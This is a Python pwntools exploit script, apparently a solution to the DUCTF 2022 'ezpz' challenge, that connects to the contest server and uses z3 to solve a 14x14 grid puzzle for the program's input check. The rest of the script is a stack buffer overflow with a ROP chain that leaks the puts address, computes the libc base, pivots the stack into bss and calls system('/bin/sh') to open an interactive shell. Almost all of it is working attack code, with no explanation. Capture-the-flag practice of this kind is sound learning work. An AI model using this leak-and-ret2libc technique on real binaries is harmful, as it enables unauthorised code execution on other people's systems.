
from itertools import product
from z3 import *
from pwn import *
import sys

elf = ELF("ezpz")
libc = ELF("libc-2.35.so")

# io = process(elf.path, env = {"LD_PRELOAD":"./libc-2.35.so"})
io = remote("2022.ductf.dev", 30005)

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# gdb.attach(io, gdb_args = ["-ex", "init-pwndbg"], gdbscript = "b *0x401555")

ARRAY_SIZE = 196

x = [BitVec(f"x{i}", 8) for i in range(ARRAY_SIZE)]
y = "aaaaabbbbcccddaaaaabbbbccccdaaeaaabbbccccdaaefaabbbcccgdeeefffffbccggdfeeffffggggggdfffffffhhhgggdffffhhhhhhgggdffijjjjhkkllmdiiijjkkkkkllmmiijjjkkkklllmmiijjjkkkklllmmijjjjjkknnllmmijjjjnnnnnllll"

s = Solver()

for xx in x:
    s.add(Or(xx == 0x31, xx == 0x30))

# chk1
for i in range(0, ARRAY_SIZE, 0xE):
    cond = sum([If(x[i + j] == ord("1"), 1, 0) for j in range(0xE) if i + j < ARRAY_SIZE])
    s.add(cond == 3)


# chk2
for i in range(0xE):
    cond = sum([If(x[i + j] == ord("1"), 1, 0) for j in range(0, ARRAY_SIZE, 0xE) if i + j < ARRAY_SIZE])
    s.add(cond == 3)


# chk3
for char in range(14):
    cond = sum([If(If(x[i] == ord("1"), ord(y[i]), 0) == ord("a") + char, 1, 0) for i in range(ARRAY_SIZE)])
    s.add(cond == 3)

# chk4
di = [-1, 0, 1, -1, 1, -1, 0, 1]
dj = [-1, -1, -1, 0, 0, 1, 1, 1]
for i, j in product(range(14), range(14)):
    for k in range(8):
        I, J = i + di[k], j + dj[k]
        if 0 <= I < 14 and 0 <= J < 14:
            s.add(If(x[14 * i + j] == 0x31, x[14 * I + J] == 0x30, True))

if s.check() == sat:
    m = s.model()
    array = [m[x[i]].as_long() if x[i] is not None else 0 for i in range(ARRAY_SIZE)]
    ans = "".join(chr(y) for y in array)
    print(ans)


pop_rdi_ret = 0x4015d3
pop_rsi_r15_ret = 0x4015d1
pop_rsp_r13_r14_r15_ret = 0x4015cd

payload = ans.encode()
payload += b"A" * (0xe0 - len(payload))
payload += p64(elf.bss() + 0xc00)
payload += p64(pop_rdi_ret)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(pop_rdi_ret)
payload += p64(elf.bss() + 0x940)
payload += p64(elf.plt["gets"])
payload += p64(pop_rsp_r13_r14_r15_ret)
payload += p64(elf.bss() + 0x928)

io.sendline(payload)
flag_rev = io.recvuntil(b"}\n")
print("flag of rev: " + flag_rev.decode())
io.recvline()
rec = io.recvline()
libc.address = u64(rec[:6] + b"\x00\x00") - libc.sym["puts"]
print("libc base addr: " + str(hex(libc.address)))

pop_rdx_r12_ret = libc.address + 0x11f497

payload = p64(pop_rdi_ret)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(pop_rsi_r15_ret)
payload += p64(0x0) * 2
payload += p64(pop_rdx_r12_ret)
payload += p64(0x0) * 2
payload += p64(libc.sym["system"])
# payload += p64(libc.address + 0xebcf8)
io.sendline(payload)

io.interactive()
